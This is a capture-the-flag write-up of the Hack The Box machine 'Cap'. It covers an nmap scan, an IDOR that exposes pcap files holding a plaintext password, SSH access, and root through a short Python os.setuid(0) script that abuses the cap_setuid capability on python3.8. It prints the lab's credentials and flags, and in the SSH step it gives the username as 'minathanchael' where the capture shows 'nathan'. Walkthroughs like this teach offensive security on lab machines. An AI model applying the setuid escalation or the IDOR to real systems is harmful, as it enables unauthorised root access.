---
title : "Hack The Box - Cap"
author: imdang 🤞🤞
date: 2024-11-12 11:33:00 +0800
categories: [Hackthebox, Hackthebox-Linux, Hackthebox-Easy]
tags: [nmap,gobuster,linpeas,python,OSCP]
---

<!-- ![image](https://user-images.githubusercontent.com/59029171/139866885-bc8556d4-7979-4d42-9d4e-027c0900f245.png) -->

<!-- **Node is about enumerating an Express NodeJS application to find an API endpoint that discloses the usernames and password hashes. To root the box is a simple buffer overflow and possible by three other unintended ways.** -->

---

# Recon
## Nmap

The first thing that I do is run nmap scan that show this results:
```console
┌──(kali㉿kali)-[~/htb/machine/cap]
└─$ nmap -sV -sC --min-rate=1000 -p- 10.10.10.245 -o nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 09:51 EST
Nmap scan report for 10.10.10.245
Host is up (0.24s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-title: Security Dashboard
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Tue, 12 Nov 2024 14:52:50 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 12 Nov 2024 14:52:44 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 12 Nov 2024 14:52:44 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=11/12%Time=67336BBB%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,2F4C,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:
SF:\x20Tue,\x2012\x20Nov\x202024\x2014:52:44\x20GMT\r\nConnection:\x20clos
SF:e\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:019386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en
SF:\">\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x2
SF:0\x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\
SF:x20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"i
SF:mage/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.cs
SF:s\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css
SF:/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"
SF:\x20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20
SF:rel=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x2
SF:0\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.m
SF:in\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/stat
SF:ic/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOp
SF:tions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Tue
SF:,\x2012\x20Nov\x202024\x2014:52:44\x20GMT\r\nConnection:\x20close\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x
SF:20OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20
SF:text/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20
SF:\x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bo
SF:dy>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20In
SF:valid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;
SF:RTSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest
SF:,189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\
SF:x20Tue,\x2012\x20Nov\x202024\x2014:52:50\x20GMT\r\nConnection:\x20close
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:232\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2
SF:\x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found<
SF:/h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x2
SF:0server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x
SF:20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 226.45 seconds
```

From the nmap results, we can see that there is port 80 which is a web service that running on the server and on port 22 is SSH and port 21 is FTP.

## Website - TCP 80

Take a look in the website, that is a link to download pcap file and enable to IDOR in ```10.10.10.245/data/<id>```

![image](https://raw.githubusercontent.com/ficstkeyfx/ficstkeyfx.github.io/refs/heads/main/.github/images/20241112_cap_idor.png)

Take to download file from id 0 and use Wireshark to see the pcap file downloaded

In the pcap file from ID 0 see a username is ```nathan``` with password ```Buck3tH4TF0RM3!```

![image](https://raw.githubusercontent.com/ficstkeyfx/ficstkeyfx.github.io/refs/heads/main/.github/images/20241112_cap_wireshark.png)

# Exploit

## User

Now, try SSH with credentials ```minathanchael``` and password ```Buck3tH4TF0RM3!```, oh well it's success :)))

User flag: ```4ddf42b5d76fbebe51eeec3ce57df1ae```

# Privilege Escalation

## Linpeas

To start, i upload ```linpeas.sh``` and run. Read the report, we will see some special execute file in ```/usr/bin/python3.8```

The ```/usr/bin/python3.8``` is found to have ```cap_setuid``` and ```cap_net_bind_service``` , which isn't the default setting.

Read some doc relate to this, i found that ```CAP_SETUID``` allows the process to gain setuid privileges without the SUID bit set.

So write some python code like this

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

And run this python with ```/usr/bin/python3.8```

```shell
/usr/bin/python3.8 poc.py
```
And now, WE ARE ROOT !! 

Root flag: ```2ca0cd32ed3c0769783f3d9934b2ae46```

# Box Rooted 

![image](https://raw.githubusercontent.com/ficstkeyfx/ficstkeyfx.github.io/refs/heads/main/.github/images/20241112_cap_boxroot.png)

<!-- HTB Profile : [ficstkeyfx](https://app.hackthebox.com/profile/244565) -->

If you find my articles interesting, you can buy me a coffee 

<a href="https://www.buymeacoffee.com/0xStarlight"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&emoji=&slug=0xStarlight&button_colour=b86e19&font_colour=ffffff&font_family=Poppins&outline_colour=ffffff&coffee_colour=FFDD00" /></a>
